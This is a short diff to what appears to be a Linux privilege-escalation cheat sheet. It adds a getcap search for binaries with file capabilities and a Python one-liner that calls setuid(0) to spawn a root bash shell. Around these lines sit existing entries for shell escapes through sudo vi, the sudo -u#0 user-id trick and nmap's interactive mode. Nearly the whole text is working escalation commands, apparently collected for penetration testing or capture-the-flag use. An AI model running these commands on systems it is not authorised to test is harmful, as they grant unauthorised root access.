@@ -11,6 +11,9 @@
   * $> sudo -u#0 vi anything
   * :!sh
 
+* getcap -r / 2>/dev/null
+  * /usr/bin/python* -c 'import os; os.setuid(0);os.system("/bin/bash");'
+
 * nmap
   * $> sudo nmap --interactive
   * !bash
